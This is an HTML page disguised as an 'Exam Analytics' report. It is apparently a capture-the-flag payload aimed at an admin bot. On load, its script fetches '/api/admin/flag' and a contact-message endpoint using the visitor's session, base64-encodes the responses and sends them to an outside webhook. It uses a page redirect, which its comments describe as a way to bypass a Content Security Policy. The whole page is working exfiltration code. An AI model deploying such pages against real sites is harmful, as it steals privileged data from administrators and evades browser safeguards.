<!DOCTYPE html>
<html>
<head>
    <title>Exam Analytics</title>
</head>
<body>
    <h1>Loading Report...</h1>
    <script>
        async function captureFlag() {
            const webhook = "https://webhooksite.net/2811e39a-8bfc-496f-8cea-7bc1a2e47012";
            const messageId = "69e229e5bee6d6b7c6628adc"; // Your Message ID
            
            try {
                // 1. Try to fetch the flag from the sensitive endpoint
                const response = await fetch('/api/admin/flag');
                const flag = await response.text();

                // 2. Use a redirect to bypass CSP connect-src
                // This carries the flag to your webhook in the URL
                window.location.href = `${webhook}?id=${messageId}&flag=${btoa(flag)}`;
                
            } catch (e) {
                // If it fails, try to fetch the message details itself 
                // Sometimes the flag is in the 'admin response' to your message
                try {
                    const msgRes = await fetch(`/api/contact/submit/${messageId}`);
                    const msgData = await msgRes.text();
                    window.location.href = `${webhook}?id=${messageId}&msgData=${btoa(msgData)}`;
                } catch (e2) {
                    window.location.href = `${webhook}?id=${messageId}&error=${btoa(e2.message)}`;
                }
            }
        }

        // Execute immediately when the bot opens the link
        captureFlag();
    </script>
</body>
</html>
